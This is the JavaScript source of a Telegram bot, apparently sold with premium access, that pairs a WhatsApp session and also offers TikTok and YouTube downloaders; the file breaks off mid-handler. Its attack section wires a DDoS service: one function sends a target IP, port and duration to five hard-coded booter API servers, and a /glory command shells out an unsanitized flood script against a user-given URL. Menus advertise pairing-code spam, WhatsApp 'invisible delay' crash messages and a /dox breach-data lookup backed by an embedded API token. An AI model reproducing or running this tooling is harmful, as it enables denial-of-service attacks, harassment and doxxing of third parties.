const { Telegraf, Markup, session } = require("telegraf"); // Tambahkan session dari telegraf
const fs = require('fs');
const moment = require('moment-timezone');
const {
    makeWASocket,
    makeInMemoryStore,
    fetchLatestBaileysVersion,
    proto,
    WAProto,
    WAMessageProto,
    MessageTypeProto,
    WAMediaUpload,
    prepareWAMessageMedia,
    useMultiFileAuthState,
    DisconnectReason,
    generateWAMessageFromContent
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const chalk = require('chalk');
const { nikParser } = require('nik-parser')
const { BOT_TOKEN } = require("./config");
const crypto = require('crypto');
const premiumFile = './premiumuser.json';
const ownerFile = './owneruser.json';
const TOKENS_FILE = "./tokens.json";
const tokenS = '5454738135:IcWCPKdL';
const apiS = 'https://leakosintapi.com/';
let bots = [];

const bot = new Telegraf(BOT_TOKEN);

bot.use(session());

let Zeph = null;
let deviceList = [];
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

const blacklist = ["6142885267", "7275301558", "1376372484"];

const randomVideos = [
    "https://files.catbox.moe/gpsled.jpg",
    "https://files.catbox.moe/6hb39u.jpg",
    "https://files.catbox.moe/llwdfe.jpg",
    "https://files.catbox.moe/ro8hst.jpg",
    "https://files.catbox.moe/r76geg.jpg",
    "https://files.catbox.moe/gaoxl0.jpg",
    "https://files.catbox.moe/pg6xgr.jpg",
    "https://files.catbox.moe/l235l7.jpg",
    "https://files.catbox.moe/4at7tg.jpg",
    "https://files.catbox.moe/vx323h.jpg",
    "https://files.catbox.moe/8ywp93.jpg",
    "https://files.catbox.moe/p3wk6q.jpg",
    "https://files.catbox.moe/91z4uq.jpg",
    "https://files.catbox.moe/f4cpgw.jpg",
    "https://files.catbox.moe/ymd466.jpg",
    "https://files.catbox.moe/kr7uq4.jpg"
];

const getRandomVideo = () => randomVideos[Math.floor(Math.random() * randomVideos.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
    const uptimeSeconds = process.uptime();
    const hours = Math.floor(uptimeSeconds / 3600);
    const minutes = Math.floor((uptimeSeconds % 3600) / 60);
    const seconds = Math.floor(uptimeSeconds % 60);

    return `${hours}h ${minutes}m ${seconds}s`;
};

const loadJSON = (file) => {
    if (!fs.existsSync(file)) return [];
    return JSON.parse(fs.readFileSync(file, 'utf8'));
};

const saveJSON = (file, data) => {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
};
// Muat ID owner dan pengguna premium
let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

// Middleware untuk memeriksa apakah pengguna adalah owner
const checkOwner = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.reply("⛔ You are not owner");
    }
    next();
};
const checkOwnerPop = (ctx, next) => {
    if (!ownerUsers.includes(ctx.from.id.toString())) {
        return ctx.answerCbQuery("⛔ You are not owner", { show_alert: true });
    }
    next();
};

// Middleware untuk memeriksa apakah pengguna adalah premium
const checkPremiumPop = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.answerCbQuery('❌ You are not a premium member', { show_alert: true });
    }
    next();
};

const checkPremium = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return ctx.reply('❌ You are not a premium member');
    }
    next();
};

const checkPremiumAi = (ctx, next) => {
    if (!premiumUsers.includes(ctx.from.id.toString())) {
        return;
    }
    next();
};

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

const startSesi = async () => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: false, 
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Succes Connected',
        }),
    };

    Zeph = makeWASocket(connectionOptions);

    Zeph.ev.on('creds.update', async () => {
        await saveCreds(); // Pastikan sesi tersimpan
    });

    store.bind(Zeph.ev);

    Zeph.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            try {
                Zeph.newsletterFollow("120363373008401043@newsletter");
            } catch (error) {
                console.error('Newsletter follow error:', error);
            }
            isWhatsAppConnected = true;
            console.log(chalk.bold.white('Connected!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

bot.command("pair", checkPremium, async (ctx) => { const userId = ctx.from.id.toString();

const args = ctx.message.text.split(" ");
if (args.length < 2) {
    return await ctx.reply("Example : /pair 628xxx");
}

let phoneNumber = args[1].replace(/[^0-9]/g, '');

if (!phoneNumber.startsWith('62')) {
    return await ctx.reply("Example : /pair 628xxx");
}

try {
    await startSesi();
    await sleep(1000);
    if (Zeph && Zeph.authState.creds.registered) {
        console.log("ℹ️ WhatsApp already connected, no need to pair again.");
        return await ctx.reply("ℹ️ WhatsApp already connected, no need to pair again.");
    }
    
    const code = await Zeph.requestPairingCode(phoneNumber);
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    const pairingMessage = `

✅ Pairing Code WhatsApp:

Nomor: ${phoneNumber}\nKode: ${formattedCode}\nafter pair please command /csender`;

await ctx.replyWithMarkdown(pairingMessage);
} catch (error) {
    console.error(chalk.red('Gagal melakukan pairing:'), error);
    await ctx.reply("❌ Pairing failed, please try again later");
}

});

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApps Sender not connected\nPlease /pair to connect sender");
    return;
  }
  next();
};

//========================================//
//#WHATS//
let isSelfMode = false; // Status awal bot di mode public
const mainOwnerId = ownerUsers[0]; // Owner utama yang sah

// Perintah untuk mengaktifkan SELF mode - hanya owner utama
bot.command('self', async (ctx) => {
    const senderId = ctx.from?.id?.toString();
    if (senderId !== mainOwnerId) return; // Silent jika bukan owner utama

    if (isSelfMode) {
        return ctx.reply("⚠ *Mode self active*", { parse_mode: "Markdown" });
    }

    isSelfMode = true;
    await ctx.reply("🔒 *Private mode is activate!*", {
        parse_mode: "Markdown"
    });
});


bot.command('public', async (ctx) => {
    const senderId = ctx.from?.id?.toString();
    if (senderId !== mainOwnerId) return;

    if (!isSelfMode) {
        return ctx.reply("✅ *Mode public active*", { parse_mode: "Markdown" });
    }

    isSelfMode = false;
    await ctx.reply("✅ *Public mode is activate!*", {
        parse_mode: "Markdown"
    });
});


bot.use(async (ctx, next) => {
    const senderId = ctx.from?.id?.toString();

   
    if (isSelfMode && senderId !== mainOwnerId) {
        return; // silent
    }

    await next();
});

bot.command("csender", checkWhatsAppConnection, checkPremium, async (ctx) => {
    const q = ctx.message.text.split(" ")[1];
    const userId = ctx.from.id;

    if (!q) {
        return ctx.reply(`ℹ️ WhatsApp Sender connected`);
    }
});


bot.command('start', async (ctx) => {
    const userId = ctx.from.id.toString();
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    
    if (blacklist.includes(userId)) {
        return ctx.reply("⛔ You have been blacklisted");
    }

    const randomVideo = getRandomVideo();
    const waktuRunPanel = getUptime(); // Waktu uptime panel

    await ctx.replyWithPhoto(randomVideo, {
        caption: `
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲 𝗕𝗼𝘁   〕

│ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳    :  @rloo11
│ 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮   :  Telegram CLI v11.12.0
│ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦    :  ${waktuRunPanel}
│ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯    :  3.0.1
│ 𝘖𝘚         :  Ubuntu x64

[+]  𝘏𝘪 ${username}
[+]  𝘠𝘰𝘶 𝘢𝘳𝘦 𝘤𝘰𝘯𝘯𝘦𝘤𝘵𝘦𝘥 𝘯𝘰𝘸.
[+]  𝘚𝘦𝘭𝘦𝘤𝘵 𝘣𝘶𝘵𝘵𝘰𝘯 𝘵𝘰 𝘣𝘦𝘨𝘪𝘯.`,
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂', 'owner'), Markup.button.url('𝗗𝗲𝘃𝗼𝗹𝗼𝗽𝗲𝗿', 'https://rlooporfli0.netlify.app/')],
            [Markup.button.callback('𝗠𝗲𝗻𝘂', 'tools_2'), Markup.button.callback('𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂', 'tools_1')]
        ])
    });
});

// Handler tombol "owner" tetap pakai checkPremium
bot.action('owner', checkOwnerPop, async (ctx) => {
    await ctx.answerCbQuery(); // hilangkan loading spinner
    const randomVideo = getRandomVideo();
    await ctx.editMessageMedia(
        {
            type: 'photo',
            media: randomVideo,
            caption: `
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗢𝘄𝗻𝗲𝗿 𝗠𝗼𝗱𝘂𝗹𝗲   〕

│ /public  -  Set bot to public
│ /self  -  Set bot to private

│ /addown  -  Add owner
│ /delown  -  Remove owner
│ /addprem  -  Add premium
│ /delprem  -  Remove premium
│ /cekprem  -  Check premium

│ /csender  -  Check sender info
│ /pair  -  Pair bot session
│ /restart  -  Restart bot

│ /onai  -  Enable AI
│ /offai  -  Disable AI

〔   𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼   〕

│ Rloo      — Dev
│ Xzreds    — Partner
│ Supriy    — RIP
│ Reja      — Partner

© 2025 𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗`
        },
        {
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔙 𝗕𝗮𝗰𝗸', 'back_to_main3')]
            ])
        }
    );
});

bot.action('back_to_main3', async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    const waktuRunPanel = getUptime(); // Dapatkan runtime terbaru

     const randomVideo = getRandomVideo();
    await ctx.editMessageMedia(
        {
            type: 'photo',
            media: randomVideo,
            caption: `
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲 𝗕𝗼𝘁   〕

│ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳    :  @rloo11
│ 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮   :  Telegram CLI v11.12.0
│ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦    :  ${waktuRunPanel}
│ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯    :  3.0.1
│ 𝘖𝘚         :  Ubuntu x64

[+]  𝘏𝘪 ${username}
[+]  𝘠𝘰𝘶 𝘢𝘳𝘦 𝘤𝘰𝘯𝘯𝘦𝘤𝘵𝘦𝘥 𝘯𝘰𝘸.
[+]  𝘚𝘦𝘭𝘦𝘤𝘵 𝘣𝘶𝘵𝘵𝘰𝘯 𝘵𝘰 𝘣𝘦𝘨𝘪𝘯.`
    },
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂', 'owner'), Markup.button.url('𝗗𝗲𝘃𝗼𝗹𝗼𝗽𝗲𝗿', 'https://rlooporfli0.netlify.app/')],
            [Markup.button.callback('𝗠𝗲𝗻𝘂', 'tools_2'), Markup.button.callback('𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂', 'tools_1')]
        ])
    });
});


// Handler untuk tombol "TOOLS 1"
bot.action('tools_1', checkPremiumPop, async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(`
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗧𝗼𝗼𝗹𝘀 𝗠𝗼𝗱𝘂𝗹𝗲   〕

│ /tls       -  High connection flood
│ /h2        -  High RPS (requests/sec)
│ /glory     -  High request per second

│ /spampair  -  Spam pairing
│ /nik       -  NIK parser
│ /dox     -  Breach data

〔   𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼   〕

│ Rloo      — Dev
│ Xzreds    — Partner
│ Supriy    — RIP
│ Reja      — Partner

© 2025 𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗`, 
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔙 𝗕𝗮𝗰𝗸', 'back_to_main2')]
        ])
    });
});

bot.action('back_to_main2', async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    const waktuRunPanel = getUptime(); // Dapatkan runtime terbaru

    const randomVideo = getRandomVideo();
    await ctx.editMessageMedia(
        {
            type: 'photo',
            media: randomVideo,
            caption: `
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲 𝗕𝗼𝘁   〕

│ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳    :  @rloo11
│ 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮   :  Telegram CLI v11.12.0
│ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦    :  ${waktuRunPanel}
│ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯    :  3.0.1
│ 𝘖𝘚         :  Ubuntu x64

[+]  𝘏𝘪 ${username}
[+]  𝘠𝘰𝘶 𝘢𝘳𝘦 𝘤𝘰𝘯𝘯𝘦𝘤𝘵𝘦𝘥 𝘯𝘰𝘸.
[+]  𝘚𝘦𝘭𝘦𝘤𝘵 𝘣𝘶𝘵𝘵𝘰𝘯 𝘵𝘰 𝘣𝘦𝘨𝘪𝘯.`
    },
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂', 'owner'), Markup.button.url('𝗗𝗲𝘃𝗼𝗹𝗼𝗽𝗲𝗿', 'https://rlooporfli0.netlify.app/')],
            [Markup.button.callback('𝗠𝗲𝗻𝘂', 'tools_2'), Markup.button.callback('𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂', 'tools_1')]
        ])
    });
});

// Handler untuk tombol "TOOLS 2"
bot.action('tools_2', checkPremiumPop, async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.editMessageCaption(`
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗  𝗚𝗹𝗶𝘁𝗰𝗵 𝗠𝗼𝗱𝘂𝗹𝗲   〕

│ /invis      -  Force chat invisible
│ /delay   -  Invisible delay message
│ /brutal  -  Invisible delay 1200
│ /hold     -  Trigger forced action

〔   𝗧𝗵𝗮𝗻𝗸𝘀 𝗧𝗼   〕

│ Rloo      — Dev
│ Xzreds    — Partner
│ Supriy    — RIP
│ Reja      — Partner

© 2025 𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗`, 
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('🔙 𝗕𝗮𝗰𝗸', 'back_to_main1')]
        ])
    });
});

bot.action('back_to_main1', async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Undefined";
    const waktuRunPanel = getUptime(); // Dapatkan runtime terbaru

    const randomVideo = getRandomVideo();
    await ctx.editMessageMedia(
        {
            type: 'photo',
            media: randomVideo,
            caption: `
〔   𝗭𝗻𝗲𝘁𝗪𝗥𝗟𝗗‌  𝗜𝗻𝘁𝗲𝗿𝗳𝗮𝗰𝗲 𝗕𝗼𝘁   〕

│ 𝘊𝘳𝘦𝘢𝘵𝘰𝘳    :  @rloo11
│ 𝘗𝘭𝘢𝘵𝘧𝘰𝘳𝘮   :  Telegram CLI v11.12.0
│ 𝘙𝘶𝘯𝘵𝘪𝘮𝘦    :  ${waktuRunPanel}
│ 𝘝𝘦𝘳𝘴𝘪𝘰𝘯    :  3.0.1
│ 𝘖𝘚         :  Ubuntu x64

[+]  𝘏𝘪 ${username}
[+]  𝘠𝘰𝘶 𝘢𝘳𝘦 𝘤𝘰𝘯𝘯𝘦𝘤𝘵𝘦𝘥 𝘯𝘰𝘸.
[+]  𝘚𝘦𝘭𝘦𝘤𝘵 𝘣𝘶𝘵𝘵𝘰𝘯 𝘵𝘰 𝘣𝘦𝘨𝘪𝘯.`
    },
    {
        parse_mode: 'Markdown',
        ...Markup.inlineKeyboard([
            [Markup.button.callback('𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂', 'owner'), Markup.button.url('𝗗𝗲𝘃𝗼𝗹𝗼𝗽𝗲𝗿', 'https://rlooporfli0.netlify.app/')],
            [Markup.button.callback('𝗠𝗲𝗻𝘂', 'tools_2'), Markup.button.callback('𝗢𝘁𝗵𝗲𝗿 𝗠𝗲𝗻𝘂', 'tools_1')]
        ])
    });
});


//FUNC DDOS//
const axios = require('axios');

const userStatus = new Map(); // Simpan status user (attack & cooldown)

// Kirim 3 API key sekaligus (selalu method=tcp)
async function attackAllApis(ip, port, time) {
    const urls = [
        `http://157.230.247.190:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`,
        `http://165.22.52.164:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`,
        `http://139.59.116.37:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`,
        `http://188.166.225.9:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`,
        `http://134.209.110.213:1927/api?key=rloo11&host=${ip}&port=${port}&time=${time}&method=tcp`
    ];

    const promises = urls.map(url =>
        axios.get(url).catch(err => {
            console.error(`[GAGAL] Attack gagal ke: ${url}`);
            return { error: true, url }; // tetap lanjut meskipun error
        })
    );

    return Promise.allSettled(promises);
}

// Countdown + edit detail
async function countdownTimer(ctx, msgId, ip, port, time) {
    for (let i = time; i > 0; i--) {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            msgId,
            undefined,
`Target Detail
IP     : ${ip}
Port   : ${port}
Time   : ${i} detik
Status : Attack in progress...`
        );
        await new Promise(resolve => setTimeout(resolve, 1000));
    }

    await ctx.telegram.editMessageText(
        ctx.chat.id,
        msgId,
        undefined,
`Target Detail
IP     : ${ip}
Port   : ${port}
Time   : ${time} detik
Status : Attack Success!`
    );
}

// Cek apakah user bisa menyerang
function canAttack(userId) {
    const status = userStatus.get(userId) || {};
    const now = Date.now();

    if (status.isAttacking) return { allowed: false, reason: "Serangan sedang berlangsung. Tunggu hingga selesai." };
    if (status.cooldownUntil && now < status.cooldownUntil) {
        const sisa = Math.ceil((status.cooldownUntil - now) / 1000);
        return { allowed: false, reason: `Cooldown aktif. Coba lagi dalam ${sisa} detik.` };
    }

    return { allowed: true };
}

// Proses serangan (untuk command /tcp dan /udp)
async function handleAttack(ctx, args) {
    if (args.length < 4) return ctx.reply(`Example:\n/${ctx.message.text.split(" ")[0].substring(1)} <ip> <port> <time>`);

    const userId = ctx.from.id;
    const { allowed, reason } = canAttack(userId);
    if (!allowed) return ctx.reply(reason);

    const ip = args[1];
    const port = args[2];
    let time = parseInt(args[3]);

    // Batas maksimal durasi serangan
    if (time > 80) time = 80;

    // Set status: menyerang
    userStatus.set(userId, { isAttacking: true });

    const msg = await ctx.reply("Menyiapkan serangan...");

    try {
        await attackAllApis(ip, port, time);
        await countdownTimer(ctx, msg.message_id, ip, port, time);

        // Setelah selesai, cooldown 10 detik
        userStatus.set(userId, {
            isAttacking: false,
            cooldownUntil: Date.now() + 5000
        });
    } catch (err) {
        userStatus.set(userId, { isAttacking: false }); // Reset status kalau error
        await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, undefined, `Gagal: ${err.message}`);
    }
}

// Command /tcp
bot.command("ishiwjdndn", checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");
    await handleAttack(ctx, args);
});


bot.command("glory", checkPremium, async (ctx) => {
    const args = ctx.message.text.split(" ");

    if (args.length < 4) {
        return ctx.reply(`Example :\n/glory https://example.com 443 60`);
    }

    const target = args[1]; // Host target
    let time = parseInt(args[3]); // Durasi serangan, dikonversi ke angka

    // Pastikan durasi tidak melebihi 100 detik
    if (time > 100) {
        time = 100;
    }

    // Kirim pesan status awal
    let processMessage = await ctx.reply(`Sent attack to [ ${target} ] during ${time} seconds!!`);

    // Jalankan perintah di VPS
    exec(`cd var/trash/ && node pidoras.js ${target} ${time} 34 2 proxy.txt`, async () => {
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `Attack method glory to ${target} has been completed`
        );
    });
});
//FUNCTION FITURE
const fetch = require('node-fetch');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');
const { InputFile } = require('telegraf');

async function uploadToCatbox(buffer) {
  let { ext } = await fromBuffer(buffer);
  let bodyForm = new FormData();
  bodyForm.append("fileToUpload", buffer, "file." + ext);
  bodyForm.append("reqtype", "fileupload");

  const res = await fetch("https://catbox.moe/user/api.php", {
    method: "POST",
    body: bodyForm
  });

  const data = await res.text();
  return data;
}

bot.command('tourl', async (ctx) => {
  const msg = ctx.message;

  // Harus reply ke media
  if (!msg.reply_to_message || !(msg.reply_to_message.photo || msg.reply_to_message.video || msg.reply_to_message.document)) {
    return ctx.reply("📎 Reply ke foto atau video yang ingin kamu upload.");
  }

  const media = msg.reply_to_message.photo
    ? msg.reply_to_message.photo[msg.reply_to_message.photo.length - 1]
    : msg.reply_to_message.video || msg.reply_to_message.document;

  const fileId = media.file_id;
  const file = await ctx.telegram.getFile(fileId);
  const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

  // Kirim pesan sedang memproses
  const sentMsg = await ctx.reply("⏳ Mengunggah media...");

  try {
    // Ambil buffer media
    const res = await fetch(fileUrl);
    const buffer = await res.buffer();

    // Validasi tipe
    const { mime } = await fromBuffer(buffer);
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
      return ctx.telegram.editMessageText(ctx.chat.id, sentMsg.message_id, null, "❌ Hanya gambar atau video mp4 yang didukung.");
    }

    // Upload ke catbox
    const link = await uploadToCatbox(buffer);
    await ctx.telegram.editMessageText(ctx.chat.id, sentMsg.message_id, null, `✅ Upload sukses:\n${link}`);
  } catch (err) {
    console.error("Upload error:", err);
    await ctx.telegram.editMessageText(ctx.chat.id, sentMsg.message_id, null, "❌ Gagal mengunggah media.");
  }
});

 //YUTUB
const { spawn } = require('child_process');
const path = require('path');
const ytSearch = require('yt-search');

bot.command('play', async (ctx) => {
    const query = ctx.message.text.split(' ').slice(1).join(' ');

    if (!query) {
        return ctx.reply('Example: /play Until i found you');
    }

    const processingMsg = await ctx.reply('🔄 *Memproses permintaan...*', {
        parse_mode: 'Markdown'
    });

    try {
        // Cari video YouTube
        const result = await ytSearch(query);
        if (!result.videos.length) {
            return ctx.telegram.editMessageText(
                ctx.chat.id,
                processingMsg.message_id,
                null,
                '❌ Video tidak ditemukan!'
            );
        }

        const video = result.videos[0];
        const titleSafe = video.title.replace(/[\/\\:*?"<>|]/g, '');
        const timestamp = Date.now();
        const baseName = `${timestamp}-${titleSafe}`;
        const outputTemplate = path.join(__dirname, `${baseName}.%(ext)s`);
        const expectedMp3 = path.join(__dirname, `${baseName}.mp3`);

        // Jalankan yt-dlp
        const ytdlp = spawn('yt-dlp', [
            '--cookies', path.join(__dirname, 'cookies.txt'),
            '-x', '--audio-format', 'mp3',
            '--audio-quality', '5', // 128kbps
            '-o', outputTemplate,
            video.url
        ]);

        let errorLog = '';
        ytdlp.stderr.on('data', (data) => {
            errorLog += data.toString();
        });

        ytdlp.on('close', async (code) => {
            // Cek apakah file hasilnya ada
            if (code !== 0 || !fs.existsSync(expectedMp3)) {
                return ctx.telegram.editMessageText(
                    ctx.chat.id,
                    processingMsg.message_id,
                    null,
                    `❌ Gagal mengunduh audio.\n\nLog:\n<pre>${errorLog.slice(0, 3000)}</pre>`,
                    { parse_mode: 'HTML' }
                );
            }

            try {
                // Coba kirim file mp3 ke Telegram
                const stats = fs.statSync(expectedMp3);
                const sizeMB = stats.size / (1024 * 1024);

                if (sizeMB > 50) {
                    throw new Error(`Ukuran file ${sizeMB.toFixed(2)} MB melebihi batas Telegram.`);
                }

                await ctx.replyWithAudio({ source: expectedMp3 }, {
                    title: video.title,
                    performer: video.author.name,
                });

                fs.unlinkSync(expectedMp3); // Hapus file setelah dikirim
                await ctx.telegram.deleteMessage(ctx.chat.id, processingMsg.message_id);
            } catch (uploadErr) {
                console.error('❌ Gagal kirim audio:', uploadErr);
                await ctx.telegram.editMessageText(
                    ctx.chat.id,
                    processingMsg.message_id,
                    null,
                    `❌ Gagal mengirim audio ke Telegram.\n\nError:\n<pre>${uploadErr.message}</pre>`,
                    { parse_mode: 'HTML' }
                );
            }
        });

    } catch (err) {
        console.error('❌ Error utama:', err);
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processingMsg.message_id,
            null,
            '❌ Terjadi kesalahan saat memproses permintaan.'
        );
    }
});
//TIKTOK 
const { v4: uuidv4 } = require('uuid');
const stream = require('stream');
const { promisify } = require('util');
const pipeline = promisify(stream.pipeline);

const downloadCache = new Map();

bot.command('tt', async (ctx) => {
    const link = ctx.message.text.split(' ')[1];
    const userId = ctx.from.id;

    if (!link || !link.includes('tiktok.com')) {
        return ctx.reply(' Example: /tt <link video tiktok>');
    }

    const processingMsg = await ctx.reply('⏳ *In process...*', { parse_mode: 'Markdown' });

    try {
        const apiURL = `https://api.tiklydown.eu.org/api/download/v5?url=${encodeURIComponent(link)}`;
        const res = await axios.get(apiURL);
        const result = res.data.result;

        if (!result) throw new Error('Data tidak lengkap dari API.');

        const photos = result.images || result.photos || null;

        if (photos && Array.isArray(photos) && photos.length > 0) {
            downloadCache.set(userId, {
                photos,
                caption: '',
                currentPhotoIndex: 0
            });

            await ctx.telegram.editMessageText(
                ctx.chat.id,
                processingMsg.message_id,
                null,
                '📷 Slideshow terdeteksi!',
                {
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                }
            );

            await ctx.replyWithPhoto(photos[0], {
                caption: `Foto 1 dari ${photos.length}`,
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '⬅️ Prev', callback_data: 'prev_photo' },
                            { text: `${1}/${photos.length}`, callback_data: 'current_photo' },
                            { text: 'Next ➡️', callback_data: 'next_photo' }
                        ]
                    ]
                }
            });

            return;
        }

        if (!result.play || !result.music) {
            throw new Error('Data video/audio tidak lengkap.');
        }

        const videoUrl = result.play;
        const audioUrl = result.music;
        const caption = `👤 Author Name: ${result.author?.nickname || 'Undefined'}\n🎬 Title: *${result.title || 'Undefined'}*\n🔗 [Link TikTok](${link})`;

        downloadCache.set(userId, { videoUrl, audioUrl, caption });

        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processingMsg.message_id,
            null,
            caption,
            {
                parse_mode: 'Markdown',
                disable_web_page_preview: true,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '🎥 Video', callback_data: 'download_video' },
                            { text: '🎵 Sound', callback_data: 'download_audio' }
                        ]
                    ]
                }
            }
        );

    } catch (err) {
        console.error(err.message);
        await ctx.telegram.editMessageText(
            ctx.chat.id,
            processingMsg.message_id,
            null,
            '❌ Failed to process TikTok link.'
        );
    }
});

bot.action('download_video', async (ctx) => {
    const userId = ctx.from.id;
    const data = downloadCache.get(userId);
    if (!data) return ctx.answerCbQuery('❌ There is no data to download.');

    await ctx.answerCbQuery('Downloading videos...');

    try {
        const tempPath = path.join(__dirname, `${uuidv4()}.mp4`);
        const response = await axios.get(data.videoUrl, { responseType: 'stream' });
        await pipeline(response.data, fs.createWriteStream(tempPath));

        await ctx.replyWithVideo({ source: tempPath }, {
            caption: data.caption,
            parse_mode: 'Markdown'
        });

        fs.unlinkSync(tempPath);
    } catch (err) {
        console.error(err.message);
        ctx.reply('❌ Failed to download video.');
    }
});

bot.action('download_audio', async (ctx) => {
    const userId = ctx.from.id;
    const data = downloadCache.get(userId);
    if (!data) return ctx.answerCbQuery('❌ No data to download.');

    await ctx.answerCbQuery('Downloading audio...');

    try {
        const tempPath = path.join(__dirname, `${uuidv4()}.mp3`);
        const response = await axios.get(data.audioUrl, { responseType: 'stream' });
        await pipeline(response.data, fs.createWriteStream(tempPath));

        await ctx.replyWithAudio({ source: tempPath }, {
            title: 'TikTok Sound',
            performer: data.caption.split('\n')[1]?.replace('👤 ', '')
        });

        fs.unlinkSync(tempPath);
    } catch (err) {
        console.error(err.message);
        ctx.reply('❌ Failed to download audio.');
    }
});

// Foto slideshow: prev/next

bot.action('prev_photo', async (ctx) => {
    const userId = ctx.from.id;
    const data = downloadCache.get(userId);
    if (!data || !data.photos) return ctx.answerCbQuery('❌ No photos available.');

    let idx = data.currentPhotoIndex;
    idx = idx <= 0 ? data.photos.length - 1 : idx - 1;
    data.currentPhotoIndex = idx;
    downloadCache.set(userId, data);

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: data.photos[idx],
            caption: `Foto ${idx + 1} dari ${data.photos.length}`,
            parse_mode: 'Markdown'
        }, {
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '⬅️ Prev', callback_data: 'prev_photo' },
